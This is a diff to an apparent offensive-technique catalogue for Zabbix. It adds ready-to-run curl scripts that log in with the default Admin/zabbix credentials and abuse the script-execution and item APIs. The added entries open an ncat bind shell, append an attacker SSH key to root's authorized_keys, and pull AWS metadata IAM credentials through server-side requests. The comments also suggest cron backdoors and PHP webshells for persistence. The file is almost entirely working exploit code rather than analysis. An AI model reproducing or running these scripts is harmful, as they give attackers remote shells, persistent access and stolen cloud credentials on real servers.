@@ -34,6 +34,36 @@ docker:
 
     '
 functions:
+  bind-shell:
+  - code: |
+      TOKEN=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"Admin","password":"zabbix"},"id":1}' \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result'])")
+
+      HOSTID=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"host.get\",\"params\":{\"limit\":1,\"output\":[\"hostid\"]},\"auth\":\"${TOKEN}\",\"id\":2}" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result'][0]['hostid'])")
+
+      SCRIPTID=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"script.create\",\"params\":{\"name\":\"bs\",\"command\":\"ncat -lvp 12345 -e /bin/sh &\",\"execute_on\":1,\"type\":0,\"scope\":2},\"auth\":\"${TOKEN}\",\"id\":3}" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['scriptids'][0])")
+
+      curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"script.execute\",\"params\":{\"scriptid\":\"${SCRIPTID}\",\"hostid\":\"${HOSTID}\"},\"auth\":\"${TOKEN}\",\"id\":4}"
+    comment: |
+      Opens a bind shell on TCP 12345 via the Zabbix admin script execution API.
+      The trailing & detaches ncat from the process so script.execute returns immediately.
+      Requires ncat (nmap package) on the Zabbix server host.
+      Connect with: nc victim.com 12345
+    connector: tcp-client
+    contexts:
+      admin:
+    platform: linux
+    tty: false
   file-read:
   - code: |
       TOKEN=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
@@ -67,6 +97,35 @@ functions:
 
       Default credentials: Admin/zabbix. The API endpoint is typically at
       /zabbix/api_jsonrpc.php or /api_jsonrpc.php.
+    contexts:
+      admin:
+  file-write:
+  - code: |
+      TOKEN=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"Admin","password":"zabbix"},"id":1}' \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result'])")
+
+      HOSTID=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"host.get\",\"params\":{\"limit\":1,\"output\":[\"hostid\"]},\"auth\":\"${TOKEN}\",\"id\":2}" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result'][0]['hostid'])")
+
+      # Write SSH authorized_keys for the zabbix process user:
+      SCRIPTID=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"script.create\",\"params\":{\"name\":\"fw\",\"command\":\"echo 'ssh-ed25519 AAAA...attacker_pubkey... attacker' >> /root/.ssh/authorized_keys\",\"execute_on\":1,\"type\":0,\"scope\":2},\"auth\":\"${TOKEN}\",\"id\":3}" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['scriptids'][0])")
+
+      curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"script.execute\",\"params\":{\"scriptid\":\"${SCRIPTID}\",\"hostid\":\"${HOSTID}\"},\"auth\":\"${TOKEN}\",\"id\":4}"
+    comment: "Writes arbitrary content to the filesystem via the Zabbix admin script\
+      \ execution API.\nThe script runs as the Zabbix server process user (commonly\
+      \ zabbix or root in Docker).\nReplace the SSH key and target path to suit the\
+      \ operation.\nOther useful write targets:\n- /etc/cron.d/backdoor  (cron-based\
+      \ persistence if running as root)\n- /var/www/html/shell.php  (PHP webshell\
+      \ \u2014 see webshell entry)\n"
     contexts:
       admin:
   rce:
@@ -134,6 +193,47 @@ functions:
       admin:
     listener: tcp-server
     tty: false
+  ssrf:
+  - code: "# SSRF via Zabbix HTTP agent item \u2014 Zabbix fetches arbitrary URLs\
+      \ server-side\nTOKEN=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php\
+      \ \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"jsonrpc\":\"2.0\",\"\
+      method\":\"user.login\",\"params\":{\"username\":\"Admin\",\"password\":\"zabbix\"\
+      },\"id\":1}' \\\n  | python3 -c \"import sys,json; print(json.load(sys.stdin)['result'])\"\
+      )\n\nHOSTID=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \\\n\
+      \  -H 'Content-Type: application/json' \\\n  -d \"{\\\"jsonrpc\\\":\\\"2.0\\\
+      \",\\\"method\\\":\\\"host.get\\\",\\\"params\\\":{\\\"limit\\\":1,\\\"output\\\
+      \":[\\\"hostid\\\"]},\\\"auth\\\":\\\"${TOKEN}\\\",\\\"id\\\":2}\" \\\n  | python3\
+      \ -c \"import sys,json; print(json.load(sys.stdin)['result'][0]['hostid'])\"\
+      )\n\n# Create an HTTP agent item that fetches the target URL and stores the\
+      \ response\nITEMID=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php\
+      \ \\\n  -H 'Content-Type: application/json' \\\n  -d \"{\\\"jsonrpc\\\":\\\"\
+      2.0\\\",\\\"method\\\":\\\"item.create\\\",\\\"params\\\":{\\\"name\\\":\\\"\
+      ssrf\\\",\\\"key_\\\":\\\"ssrf.probe\\\",\\\"hostid\\\":\\\"${HOSTID}\\\",\\\
+      \"type\\\":19,\\\"value_type\\\":4,\\\"delay\\\":\\\"30s\\\",\\\"url\\\":\\\"\
+      http://169.254.169.254/latest/meta-data/iam/security-credentials/\\\"},\\\"\
+      auth\\\":\\\"${TOKEN}\\\",\\\"id\\\":3}\" \\\n  | python3 -c \"import sys,json;\
+      \ print(json.load(sys.stdin)['result']['itemids'][0])\")\n\necho \"[*] Item\
+      \ created: $ITEMID \u2014 wait one poll cycle (30s) then read value:\"\nsleep\
+      \ 35\ncurl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \\\n  -H 'Content-Type:\
+      \ application/json' \\\n  -d \"{\\\"jsonrpc\\\":\\\"2.0\\\",\\\"method\\\":\\\
+      \"item.get\\\",\\\"params\\\":{\\\"itemids\\\":[\\\"${ITEMID}\\\"],\\\"output\\\
+      \":[\\\"lastvalue\\\"]},\\\"auth\\\":\\\"${TOKEN}\\\",\\\"id\\\":4}\" \\\n \
+      \ | python3 -c \"import sys,json; print(json.load(sys.stdin)['result'][0]['lastvalue'])\"\
+      \n"
+    comment: "Zabbix HTTP agent items (type=19) make outbound HTTP GET requests to\
+      \ the configured URL\non each poll cycle and store the response body as the\
+      \ item's last value. This is a\nfull-read SSRF \u2014 the complete response\
+      \ body is returned via the item.get API.\n\nThe request originates from the\
+      \ Zabbix server host, which typically has access to:\n- AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\
+      - GCP:        http://metadata.google.internal/computeMetadata/v1/\n- Azure:\
+      \      http://169.254.169.254/metadata/instance?api-version=2021-02-01\n- Internal\
+      \ Kubernetes API, Redis, databases not accessible from the attacker network\n\
+      \nThis is a design-level feature of Zabbix, not a CVE. Admin credentials required.\n\
+      Alternatively, use the script execution API to run curl against internal endpoints:\n\
+      \  command: \"curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\
+      \n"
+    contexts:
+      admin:
   webshell:
   - code: |
       TOKEN=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
